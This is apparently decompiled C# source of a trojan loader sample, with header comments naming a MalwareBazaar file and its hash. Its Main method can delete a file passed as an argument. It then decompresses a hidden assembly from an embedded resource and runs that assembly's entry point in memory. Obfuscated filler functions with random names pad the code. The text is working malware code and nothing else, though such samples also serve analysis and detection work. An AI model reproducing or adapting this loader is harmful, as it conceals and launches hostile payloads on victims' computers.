// Decompiled with JetBrains decompiler
// Type: wfjTMescjLpWChp
// Assembly: tmp1.tmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 47A5EB45-1E10-4398-BFDB-DFCD116FF1F2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.Win32.Generic-53932f1884feb7b36f725065bab39fb30402b7d75ba305124141a3aed7c211a4.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;

[StandardModule]
public sealed class wfjTMescjLpWChp
{
  public static string uHeEE00(string rsbqz0, string MvHgH0, string qXdVl0)
  {
    string[] strArray1 = new string[5]
    {
      "uHeEE0",
      nameof (rsbqz0),
      nameof (MvHgH0),
      nameof (qXdVl0),
      "eflhW0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], rsbqz0, false) != 0)
    {
      MvHgH0 = qXdVl0 + rsbqz0;
      if (qXdVl0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (qXdVl0.Length - 1));
        while (MvHgH0.Length == 2)
        {
          if (rsbqz0.Contains(strArray1[1]))
            return rsbqz0;
        }
      }
    }
    return rsbqz0;
  }

  public static string BLxvr11(string pRSWu1, string weqyJ1, string BtxVC1)
  {
    string[] strArray1 = new string[5]
    {
      "BLxvr1",
      nameof (pRSWu1),
      nameof (weqyJ1),
      nameof (BtxVC1),
      "swrCx1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], pRSWu1, false) != 0)
    {
      weqyJ1 = BtxVC1 + pRSWu1;
      if (BtxVC1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (BtxVC1.Length - 1));
        while (weqyJ1.Length == 2)
        {
          if (pRSWu1.Contains(strArray1[1]))
            return pRSWu1;
        }
      }
    }
    return pRSWu1;
  }

  [STAThread]
  public static void Main(string[] args)
  {
    if (args.Length <= 0)
    {
      IRlDEzIKQQfMWBa.PMruBvSTgVNzCwg();
    }
    else
    {
      try
      {
        File.Delete(args[0]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    Assembly.Load(wfjTMescjLpWChp.Deflate_D((byte[]) new ResourceManager("zCom", Assembly.GetExecutingAssembly()).GetObject("file"))).EntryPoint.Invoke((object) null, (object[]) null);
  }

  public static byte[] Deflate_D(byte[] DataZ)
  {
    byte[] numArray;
    try
    {
      numArray = wfjTMescjLpWChp.getStreamBytesX((Stream) new DeflateStream((Stream) new MemoryStream(DataZ), CompressionMode.Decompress, true), DataZ.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] getStreamBytesX(Stream dataStr, int dataChunks)
  {
    int offset = 0;
    byte[] streamBytesX;
    try
    {
      byte[] numArray;
      while (true)
      {
        numArray = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset + dataChunks + 1)]);
        int num = dataStr.Read(numArray, offset, dataChunks);
        if (num != 0)
          checked { offset += num; }
        else
          break;
      }
      streamBytesX = (byte[]) Utils.CopyArray((Array) numArray, (Array) new byte[checked (offset - 1 + 1)]);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      streamBytesX = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return streamBytesX;
  }

  public static string kiNdv00(string yyLLz0, string EHjAh0, string Gykyr0)
  {
    string[] strArray1 = new string[5]
    {
      "kiNdv0",
      nameof (yyLLz0),
      nameof (EHjAh0),
      nameof (Gykyr0),
      "BhdPl0"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], yyLLz0, false) != 0)
    {
      EHjAh0 = Gykyr0 + yyLLz0;
      if (Gykyr0.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (Gykyr0.Length - 1));
        while (EHjAh0.Length == 2)
        {
          if (yyLLz0.Contains(strArray1[1]))
            return yyLLz0;
        }
      }
    }
    return yyLLz0;
  }

  public static string pYUJf11(string XbFzW1, string ZwKvk1, string ljcuq1)
  {
    string[] strArray1 = new string[5]
    {
      "pYUJf1",
      nameof (XbFzW1),
      nameof (ZwKvk1),
      nameof (ljcuq1),
      "iSdBf1"
    };
    string[] strArray2 = strArray1;
    int index = 0;
    if (index >= strArray2.Length)
    {
      string str;
      return str;
    }
    string str1 = strArray2[index];
    while (Operators.CompareString(strArray1[0], XbFzW1, false) != 0)
    {
      ZwKvk1 = ljcuq1 + XbFzW1;
      if (ljcuq1.Contains(strArray1[2]))
      {
        str1 = Conversions.ToString(checked (ljcuq1.Length - 1));
        while (ZwKvk1.Length == 2)
        {
          if (XbFzW1.Contains(strArray1[1]))
            return XbFzW1;
        }
      }
    }
    return XbFzW1;
  }
}
